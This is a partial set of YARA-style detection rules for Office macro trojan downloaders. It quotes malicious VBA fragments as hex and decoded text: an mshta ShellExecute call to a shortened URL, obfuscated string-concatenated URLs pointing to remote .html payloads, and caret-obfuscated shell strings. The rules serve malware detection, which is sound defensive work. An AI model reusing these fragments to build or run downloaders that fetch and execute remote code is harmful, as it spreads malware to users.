...
rule TrojanDownloader_O97M_EncDoc_SM_MTB{
	...
	strings :
		$a_01_0 = {53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 6d 73 68 74 61 22 2c 20 22 68 74 74 70 73 3a 2f 2f 62 69 74 6c 79 2e 63 6f 6d 2f 61 73 64 71 77 64 77 64 73 66 76 63 78 76 63 63 76 22 2c 20 22 22 2c 20 22 22 2c 20 30 } //01 00  ShellExecute "mshta", "https://bitly.com/asdqwdwdsfvcxvccv", "", "", 0
		$a_01_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 6e 65 77 3a 31 33 37 30 39 36 32 30 2d 43 32 37 39 2d 31 31 43 45 2d 41 34 39 45 2d 34 34 34 35 35 33 35 34 30 30 30 30 22 29 } //00 00  CreateObject("new:13709620-C279-11CE-A49E-444553540000")
	condition:
		any of ($a_*)
...
rule TrojanDownloader_O97M_EncDoc_SM_MTB_2{
	...
	strings :
		$a_01_0 = {22 68 22 26 22 74 22 26 22 74 70 22 26 22 73 3a 2f 2f 73 61 22 26 22 6d 74 6e 70 79 2e 6f 72 67 2f 62 76 65 43 47 4b 54 58 2f 67 68 62 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 2c 22 } //03 00  "h"&"t"&"tp"&"s://sa"&"mtnpy.org/bveCGKTX/ghb.h"&"t"&"m"&"l","
		$a_01_1 = {22 68 22 26 22 74 74 22 26 22 70 73 3a 2f 2f 6d 22 26 22 61 73 73 22 26 22 6e 67 6f 2e 6f 72 67 2f 64 58 4b 76 79 4b 56 39 76 38 63 2f 67 68 62 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 2c 22 } //00 00  "h"&"tt"&"ps://m"&"ass"&"ngo.org/dXKvyKV9v8c/ghb.h"&"t"&"m"&"l","
	condition:
		any of ($a_*)
...
rule TrojanDownloader_O97M_EncDoc_SM_MTB_3{
	...
	strings :
		...
		$a_01_1 = {6b 6f 32 20 3d 20 22 74 70 73 3a 2f 2f } //01 00  ko2 = "tps://
		$a_01_2 = {6b 6f 32 33 20 3d 20 22 62 69 74 6c 79 2e 63 6f 6d 2f } //01 00  ko23 = "bitly.com/
		$a_03_3 = {6f 6b 33 20 3d 20 22 90 02 aa 22 90 00 } //01 00 
		$a_01_4 = {59 61 68 6f 6f 64 69 31 31 31 31 20 3d 20 70 64 61 73 31 20 2b 20 6b 6f 32 20 2b 20 6b 6f 32 33 20 2b 20 6f 6b 33 } //00 00  Yahoodi1111 = pdas1 + ko2 + ko23 + ok3
	condition:
		any of ($a_*)
...
rule TrojanDownloader_O97M_EncDoc_SM_MTB_5{
	...
	strings :
		...
		$a_01_1 = {3d 20 22 68 65 5e 6c 6c 22 } //02 00  = "he^ll"
